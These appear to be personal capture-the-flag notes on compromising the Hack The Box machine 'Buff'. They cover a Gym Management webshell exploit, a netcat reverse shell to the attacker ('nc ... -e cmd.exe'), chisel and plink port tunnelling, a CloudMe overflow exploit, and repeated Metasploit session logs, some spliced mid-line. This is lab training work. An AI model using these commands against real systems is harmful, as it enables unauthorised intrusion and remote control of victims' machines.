# Buff

10.10.10.198

# Enumerate

## Scan

* 7680: pando-pub
* 8080: web-page

## Explore Services

* Web
  * projectworlds.in copyright?
  * contact page has 'gym managemetn sw 1.0'?
  * dirbuster
    * /profile/ gives parse error that shows it's running xampp
    * /img/ shows Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
    * /cgi-bin/ -> nothing
    * /admin/ page to 'create a pdf invoice with php' 
    * /upload and /upload/ w/ 301 & 403

# Accessmsf5 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.10.14.19:1234 
[*] Encoded stage with x86/shikata_ga_nai
[*] Sending encoded stage (267 bytes) to 10.10.10.198
[*] Command shell session 1 opened (10.10.14.19:1234 -> 10.10.10.198:49710) at 2020-11-06 16:29:20 -0500

* 7680 - actually pando? Maybe WUDO? Can send files to it maybe? No vuln listed for either. 

* login vulnerable? never ran sqlmap

* msf5 exploit(multi/handler) > exploit
  
  [*] Started reverse TCP handler on 10.10.14.19:1234 
  [*] Encoded stage with x86/shikata_ga_nai
  [*] Sending encoded stage (267 bytes) to 10.10.10.198
  [*] Command shell session 1 opened (10.10.14.19:1234 -> 10.10.10.198:49710) at 2020-11-06 16:29:20 -0500Admin page
  
* * can change it to allow me to upload but doesn't let me run things since it wants to transfer an image to I guess just include it in the pdf. 
  
* Apparently the gym management thing isn't just made up and it's real and there's an exploit for it. 

* ~~~
  pat@kali:~/Desktop/Cert_Prep/htb/Windows/Buff$ python 48506.py "http://10.10.10.198:8080/"
              /\
  /vvvvvvvvvvvv \--------------------------------------,                                                                                                                                                                                                  
  `^^^^^^^^^^^^ /============BOKU====================="
              \/
  
  [+] Successfully connected to webshell.
  C:\xampp\htdocs\gym\upload> 
  
  ~~~

# Escalate

* Need to get user flag from someone else maybe? Says I'm buff/shaun

* Maybe now with access I can upload a better shell over ps or something?

* Upload nc and use that to get shell

* ~~~
  nc 10.10.14.19 1235 -e cmd.exe
  # That gives me a local shell after using nc -lvnp 1235
  # Interactive shell and I can CD to shaun
  C:\Users\shaun\Desktop>type user.txt
  type user.txt
  <>
  
  ~~~

* Could have also done it with url. Since the php script uses a shell exec on $_GET[], if I visit that php file and put ?telepathy=<> that will run the command. 

* Fine the CloudMe binary in the Downloads and searchsploit gives an exploit for it. 

* Use netstat and tasklist and there's a few other ports that I don't expect something to be listening on? The 49X ones are probably some windows thing? Not sure what 7680 is. The exploit has the port as 8888 so that's probably it. 

* Tried to get something to forward the local port

  * plink didn't seem to work, just getting errors on connecting? 
  * chisel didn't work - tried in both directions
  * I can't run an uploaded meterpreter payload? 

* I guess I just wasn't using them right. Not sure what the issue was but I got chisel to work. I may have been trying to double up on ports and it didn't error at me it just failed without saying that there was a port conflict since the client doesn't really know? Apparenlt 

~~~
pat@kali:~/Desktop/Cert_Prep/htb/Windows/Buff$ ./chisel_1.7.2_linux_amd64 server -p 8080 -reverse

C:\xampp\htdocs\gym\upload>chisel.exe client 10.10.14.19:8080 R:8889:127.0.0.1:8888
chisel.exe client 10.10.14.19:8080 R:8889:127.0.0.1:8888
2020/11/06 21:25:54 client: Connecting to ws://10.10.14.19:8080
2020/11/06 21:25:55 client: Fingerprint 7d:aa:ef:2d:27:c6:67:a1:e9:e9:1d:00:cc:6f:c8:40
2020/11/06 21:25:55 client: Connected (Latency 131.232ms)

//start listener and change the shellcode in the exploit
// msfvenom -p LHOST= LPORT= -f python

pat@kali:~/Desktop/Cert_Prep/htb/Windows/Buff$ python 48389.py 
~~~

Comment on another page that plink works with this. I had tried without the echo but I think that he just added that to go through webshell. Other sources in the excel didn't work either. 

~~~
echo y | plink.exe [10.10.14.10]-l root -pw "password" -R 4000:[127.0.0.1:8888]
~~~

Either way, get a callback to msf and then get flag. 

~~~
msf5 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.10.14.19:1234 
[*] Encoded stage with x86/shikata_ga_nai
[*] Sending encoded stage (267 bytes) to 10.10.10.198
[*] Command shell session 1 opened (10.10.14.19:1234 -> 10.10.10.198:49710) at 2020-11-06 16:29:20 -0500
~~~



